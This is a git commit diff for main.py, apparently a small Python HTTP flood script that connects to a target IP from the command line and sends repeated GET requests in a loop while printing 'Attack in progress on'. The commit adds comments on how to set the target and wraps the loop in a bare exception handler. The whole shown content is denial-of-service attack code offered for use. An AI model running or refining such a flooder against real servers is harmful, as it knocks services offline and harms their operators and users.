feb4499cdd4e5a0bea4a9e74018e2da524b89770
7daylenrobertson <9daylenrobertson@gmail.com>
2020-06-08 14:47:52 -0400

    Added more comments and try and except handler

--- main.py
+++ main.py
@@ -7,10 +7,12 @@ def attackServer(traffic):
 
     #this connects with the server
     #pid = os.fork()
-    serverr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
+    serverr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    #set your ipaddress target in the command line call or else this line will fail  
     serverr.connect((sys.argv[1], 80))   
     
-    #this sends the requests
+    #this sends the requests, have your second section of call apache or similar
     print (">> GET /" + sys.argv[2] + " HTTP/1.1")
     serverr.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")   
     serverr.send("Host: " + sys.argv[1]  + "\r\n\r\n"); 
@@ -27,5 +29,7 @@ print ("Attack in progress on: " + sys.argv[1])
 
 
 for i in range(1, traffic):   
-
-    attackServer(traffic)  
+    try:
+        attackServer(traffic)
+    except:
+        print("failure to connect")  
